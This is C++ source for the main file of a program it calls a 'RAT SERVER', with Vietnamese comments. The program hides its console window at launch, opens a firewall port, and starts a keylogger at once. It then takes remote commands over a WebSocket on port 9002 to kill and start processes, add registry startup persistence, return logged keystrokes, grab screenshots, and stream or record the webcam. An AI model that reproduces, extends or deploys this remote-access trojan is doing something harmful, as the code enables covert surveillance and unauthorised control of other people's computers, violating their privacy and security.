// Dòng này giấu cửa sổ Console đi ngay khi khởi động (Không hiện màn hình đen)
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#include "Global.h"
#include "SystemManager.h"
#include "Keylogger.h"
#include "MediaManager.h"

// Tắt cảnh báo biên dịch không cần thiết
#pragma warning(push)
#pragma warning(disable : 4267) // Tắt cảnh báo size_t to int
#pragma warning(disable : 4244) // Tắt cảnh báo mất dữ liệu số
#pragma warning(disable : 4996) // Tắt cảnh báo deprecated
#pragma warning(disable : 26812) // Tắt cảnh báo enum class 

// --- HÀM XỬ LÝ SỰ KIỆN NHẬN TIN NHẮN TỪ CLIENT ---
void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr msg) {
    std::string payload = msg->get_payload();

    try {
        // Parse dữ liệu JSON từ Client gửi lên
        auto j_req = json::parse(payload);

        // Kiểm tra xem gói tin có chứa lệnh "cmd" không
        if (j_req.contains("cmd")) {
            std::string cmd = j_req["cmd"];
            json j_res; // Biến JSON để chứa kết quả trả về

            // =============================================================
            // 1. NHÓM LỆNH: PROCESS (QUẢN LÝ TIẾN TRÌNH)
            // =============================================================
            if (cmd == "LIST_PROC") {
                j_res["data"] = GetProcessList();
                j_res["type"] = "LIST_RESULT";
            }
            else if (cmd == "KILL_PROC") {
                // Xử lý diệt theo PID (Số)
                if (j_req.contains("pid")) {
                    int pid = std::stoi(j_req["pid"].get<std::string>());
                    bool success = KillProcessByPID(pid);

                    if (success) {
                        j_res["msg"] = "THÀNH CÔNG: Đã diệt Process có PID: " + std::to_string(pid);
                    }
                    else {
                        j_res["msg"] = "THẤT BẠI: Không tìm thấy PID: " + std::to_string(pid) + " hoặc quyền truy cập bị từ chối.";
                    }
                }
                // Xử lý diệt theo Tên (Chuỗi)
                else if (j_req.contains("proc_name")) {
                    std::string name = j_req["proc_name"];
                    int count = KillProcessByName(name);

                    if (count > 0) {
                        j_res["msg"] = "THÀNH CÔNG: Đã diệt tổng cộng " + std::to_string(count) + " tiến trình có tên: " + name;
                    }
                    else {
                        j_res["msg"] = "THẤT BẠI: Không tìm thấy tiến trình có tên: " + name;
                    }
                }
                j_res["type"] = "ACTION_RESULT";
            }

            else if (cmd == "START_PROC") {
                std::string name = j_req["name"];
                // Giả định StartApp trong SystemManager.cpp trả về bool (>32 là thành công)
                bool success = StartApp(name);

                if (success) {
                    j_res["msg"] = "THÀNH CÔNG: Đã khởi chạy ứng dụng/web: " + name;
                }
                else {
                    j_res["msg"] = "THẤT BẠI: Không thể mở '" + name + "'. Kiểm tra tên hoặc đường dẫn.";
                }
                j_res["type"] = "ACTION_RESULT";
            }

            // =============================================================
            // 2. NHÓM LỆNH: SYSTEM (HỆ THỐNG)
            // =============================================================
            else if (cmd == "SYSTEM_CONTROL") {
                std::string type = j_req["type"];
                SystemControl(type);
                j_res["msg"] = "Da thuc thi lenh he thong: " + type;
                j_res["type"] = "ACTION_RESULT";
            }

            else if (cmd == "PERSISTENCE") {
                std::string mode = j_req["mode"]; // "ON" hoặc "OFF"
                bool ok = false;

                if (mode == "ON") {
                    ok = InstallStartup();
                    j_res["msg"] = ok ? "DA CAI DAT: Server se tu chay khi bat may." : "LOI: Khong the ghi Registry.";
                }
                else {
                    ok = RemoveStartup();
                    j_res["msg"] = ok ? "DA GO BO: Server se khong tu chay nua." : "LOI: Khong tim thay hoac khong the xoa Registry.";
                }
                j_res["type"] = "ACTION_RESULT";
            }

            // =============================================================
            // 3. NHÓM LỆNH: KEYLOGGER (BÀN PHÍM)
            // =============================================================
            else if (cmd == "START_KEYLOG") {
                // Khóa luồng để thao tác an toàn với biến toàn cục
                std::lock_guard<std::mutex> lock(g_LogMutex);

                g_KeylogBuffer = ""; // Xóa sạch dữ liệu cũ
                g_PendingModifiers.clear(); // Reset trạng thái phím

                j_res["msg"] = "Da xoa bo nho dem (Reset Keylog)";
                j_res["type"] = "ACTION_RESULT";
            }
            else if (cmd == "GET_KEYLOG") {
                std::lock_guard<std::mutex> lock(g_LogMutex);

                j_res["data"] = g_KeylogBuffer; // Lấy dữ liệu
                g_KeylogBuffer = "";            // Xóa sau khi lấy để tránh trùng lặp
                j_res["type"] = "KEYLOG_RESULT";
            }

            // =============================================================
            // 4. NHÓM LỆNH: MEDIA (HÌNH ẢNH & CAMERA)
            // =============================================================
            else if (cmd == "SCREENSHOT") {
                // Chụp màn hình và nhận về chuỗi Base64
                std::string base64Img = CaptureScreenBase64();

                j_res["data"] = base64Img;
                j_res["type"] = "SCREENSHOT_RESULT";
            }
            else if (cmd == "START_CAM") {
                if (g_IsStreaming) {
                    j_res["msg"] = "Webcam is running";
                }
                else {
                    StartWebcamStream(s, hdl);
                    j_res["msg"] = "Webcam Started";
                }
                j_res["type"] = "ACTION_RESULT";
            }
            else if (cmd == "STOP_CAM") {
                g_IsStreaming = false; // Đổi cờ hiệu, luồng Webcam sẽ tự thoát vòng lặp

                // [FIX]: Thêm độ trễ 200ms để luồng Webcam kịp thời giải phóng tài nguyên.
                std::this_thread::sleep_for(std::chrono::milliseconds(200));

                j_res["msg"] = "Da gui lenh dung Webcam...";
                j_res["type"] = "ACTION_RESULT";
            }
            else if (cmd == "RECORD_CAM") {
                if (g_IsStreaming) {
                    j_res["msg"] = "Loi: Hay tat Stream truoc!";
                }
                else {
                    StartRecordVideo(s, hdl);
                    j_res["msg"] = "Dang ghi hinh 10s...";
                }
                j_res["type"] = "ACTION_RESULT";
            }

            // =============================================================
            else if (cmd == "KILL_SERVER") {
                j_res["msg"] = "Server da nhan lenh tu huy. Tam biet!";
                j_res["type"] = "ACTION_RESULT";

                // Gửi tin nhắn phản hồi trước khi chết để Client biết
                s->send(hdl, j_res.dump(), msg->get_opcode());

                // Tạo một luồng riêng để thực hiện hành động tắt sau 1 giây
                // (Phải đợi 1s để tin nhắn trên kịp gửi đi qua mạng)
                std::thread([]() {
                std::this_thread::sleep_for(std::chrono::seconds(1));
                exit(0); // Lệnh tắt chương trình ngay lập tức
                }).detach();

            // Không break, để nó chạy xuống cuối hàm cho đúng logic (dù sắp tắt)
            }

            // =============================================================
            // GỬI PHẢN HỒI VỀ CLIENT
            // =============================================================
            j_res["status"] = "OK";

            // Chuyển JSON thành chuỗi và gửi đi
            s->send(hdl, j_res.dump(), websocketpp::frame::opcode::text);
        }
    }
    catch (std::exception& e) {
        std::cout << "[ERROR] Loi xu ly tin nhan: " << e.what() << std::endl;
    }
    catch (...) {
        std::cout << "[ERROR] Loi khong xac dinh!" << std::endl;
    }
}

// --- SỰ KIỆN KHI CÓ KẾT NỐI MỚI ---
void on_open(server* s, websocketpp::connection_hdl hdl) {
    std::cout << ">>> Client CONNECTED (Ket noi thanh cong)" << std::endl;
}

// --- SỰ KIỆN KHI NGẮT KẾT NỐI ---
void on_close(server* s, websocketpp::connection_hdl hdl) {
    std::cout << "<<< Client DISCONNECTED (Ngat ket noi)" << std::endl;
}

// =================================================================================
// HÀM MAIN (CHƯƠNG TRÌNH CHÍNH)
// =================================================================================
int main() {
    // 1. Cấu hình DPI (Để chụp màn hình độ phân giải cao không bị cắt)
    SetProcessDPIAware();

    // Tự động mở cổng Firewall ngay khi chạy
    // Lưu ý: Cần chạy với quyền Admin để lệnh này có tác dụng
    SetupFirewall();

    // 2. Khởi tạo GDI+ (Thư viện đồ họa Windows)
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    //std::string myIP = GetLocalIPAddress();
    //std::cout << ">>> DETECTED LAN IP: " << myIP << std::endl;
    //// Ghi ra file để xem(vì Stealth Mode sẽ ẩn console)
    //std::ofstream ipFile("server_ip.txt");
    //if (ipFile.is_open()) {
    //    ipFile << "Server IP Address: " << myIP << "\n";
    //    ipFile << "Port: 9002\n";
    //    ipFile << "Copy IP nay va nhap vao Web Client.";
    //    ipFile.close();
    //}

    std::cout << "==========================================" << std::endl;
    std::cout << "   RAT SERVER                             " << std::endl;
    std::cout << "   Port: 9002                             " << std::endl;
    std::cout << "==========================================" << std::endl;

    // 3. Khởi động Keylogger (Chạy ngầm ngay lập tức)
    StartKeyloggerThread();

    // 4. Khởi tạo Server WebSocket
    server echo_server;

    try {
        // Tắt bớt log rác để màn hình console sạch sẽ
        echo_server.clear_access_channels(websocketpp::log::alevel::all);

        // Khởi tạo ASIO
        echo_server.init_asio();

        // Đăng ký các hàm xử lý sự kiện
        echo_server.set_message_handler(bind(&on_message, &echo_server, std::placeholders::_1, std::placeholders::_2));
        echo_server.set_open_handler(bind(&on_open, &echo_server, std::placeholders::_1));
        echo_server.set_close_handler(bind(&on_close, &echo_server, std::placeholders::_1));

        // Lắng nghe cổng 9002
        echo_server.listen(9002);

        // Bắt đầu chấp nhận kết nối
        echo_server.start_accept();

        // Vòng lặp chính (Chương trình sẽ chạy mãi ở đây)
        echo_server.run();
    }
    catch (std::exception const& e) {
        std::cout << "[FATAL ERROR] Loi Server: " << e.what() << std::endl;
    }

    // 5. Dọn dẹp tài nguyên khi tắt chương trình
    GdiplusShutdown(gdiplusToken);

    return 0;
}